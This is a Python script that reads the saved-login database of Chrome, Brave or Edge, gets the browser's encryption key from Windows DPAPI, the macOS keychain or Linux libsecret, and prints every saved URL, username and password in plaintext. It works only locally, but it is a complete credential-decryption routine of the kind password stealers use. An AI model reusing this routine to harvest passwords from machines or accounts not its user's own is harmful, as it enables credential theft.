import sqlite3
import os
import plyer
import json
import sys
import platform


class OS:
    def is_mac():
        return platform.system() == 'Darwin'

    def is_lin():
        return platform.system() == 'Linux'

    def is_win():
        return platform.system() == 'Windows'

    @classmethod
    def is_posix(cls):
        return cls.is_lin() or cls.is_mac()


assert OS.is_posix or OS.is_win(
), 'Script is not implement for other than Mac, Linux and Windows platforms...'

# Mac and Linux
if OS.is_posix():
    from backports.pbkdf2 import pbkdf2_hmac
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad

if OS.is_mac():
    import keyring

if OS.is_lin():
    import gi
    gi.require_version('Secret', '1')
    from gi.repository import Secret

if OS.is_win():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    import win32crypt
    import base64


def detect_browser_from_path(path):
    # In windows, browser name is present above the UserData directory.
    # So, going back to one directory above.
    if OS.is_win():
        path = os.path.dirname(path)
    basename = os.path.basename(path).lower()
    browsers = ('chrome', 'brave', 'edge')
    for browser in browsers:
        if browser in basename:
            return browser
    raise Exception('Can not find browser from browser path', basename)


class Profile:
    def __init__(self):
        self.login_db_file = plyer.filechooser.open_file()[0]
        self.profile_path = os.path.abspath(
            os.path.dirname(self.login_db_file))
        self.browser_path = os.path.abspath(
            os.path.join(self.profile_path, os.path.pardir))
        self.local_state = os.path.join(self.browser_path, 'Local State')
        self.browser = detect_browser_from_path(self.browser_path)
        self.init_enc_key()
        self.init_passwords()

    def print_passwords(self):
        for data in self.passwords:
            print('\n')
            print('*'*100)
            print('URL:', data[0])
            print('Username:', data[1])
            print('Password:', self.decrypt(data[2]).decode('utf-8'))
            print('*'*100)
            print('\n')

    def init_passwords(self):
        try:
            conn = sqlite3.connect(self.login_db_file)
            cur = conn.cursor()
            cur.execute(
                'SELECT origin_url, username_value, password_value FROM logins')
            # Update passwords
            rows = cur.fetchall()
            self.passwords = rows
            # Close connections
            cur.close()
            conn.close()
        except Exception as e:
            print('Exception occured while reading login database...', e)
            sys.exit(1)

    def decrypt(self, password):
        decrypted_data = ''
        if OS.is_posix():
            decrypted_data = self.decrypt_posix(password)
        elif OS.is_win():
            decrypted_data = self.decrypt_win(password)
        return decrypted_data

    def decrypt_win(self, password):
        aesgcm = AESGCM(self.key)
        version, nonce, enc_pass = password[:3], password[3:15], password[15:]
        return aesgcm.decrypt(nonce, enc_pass, b'')

    def decrypt_posix(self, password):
        prefix = b'v11' if OS.is_lin() else b'v10'
        iteration = 1 if OS.is_lin() else 1003
        if password.startswith(prefix):
            password = password[3:]
        key = pbkdf2_hmac('sha1', self.key.encode('utf-8'),
                          b'saltysalt', iteration, AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, b' '*AES.block_size)
        return unpad(cipher.decrypt(password[:AES.block_size]), AES.block_size)

    def init_enc_key(self):
        if OS.is_lin():
            self.init_enc_key_lin()
        elif OS.is_win():
            self.init_enc_key_win()
        elif OS.is_mac():
            self.init_enc_key_mac()

    def init_enc_key_win(self):
        if not os.path.exists(self.local_state):
            raise FileNotFoundError(
                'Local state file is not present', self.local_state)
        raw_json = ''
        with open(self.local_state, 'r') as local_state:
            raw_json = local_state.read()

        parsed_json = json.loads(raw_json)
        encrypted_key = parsed_json.get(
            'os_crypt', dict()).get('encrypted_key', None)

        if not encrypted_key:
            raise Exception('Encrypted key not present in the local state')

        dpapi_key = base64.b64decode(encrypted_key)
        # Remove DPAPI prefix
        dpapi_key = dpapi_key[5:]
        _, self.key = win32crypt.CryptUnprotectData(
            dpapi_key, None, None, None, 0)

    def init_enc_key_lin(self):
        appid = self.browser
        schema = Secret.Schema.new(
            "chrome_libsecret_os_crypt_password_v2",
            Secret.SchemaFlags.DONT_MATCH_NAME,
            {
                "application": Secret.SchemaAttributeType.STRING,
            },
        )

        attributes = {"application": appid}

        self.key = Secret.password_search_sync(schema, attributes, Secret.SearchFlags.UNLOCK, None)[
            0].retrieve_secret_sync().get_text()

    def init_enc_key_mac(self):
        service_name = f'{self.browser.capitalize()} Safe Storage'
        username = self.browser.capitalize()
        self.key = keyring.get_password(service_name, username)


if __name__ == '__main__':
    profile: Profile = Profile()
    profile.print_passwords()
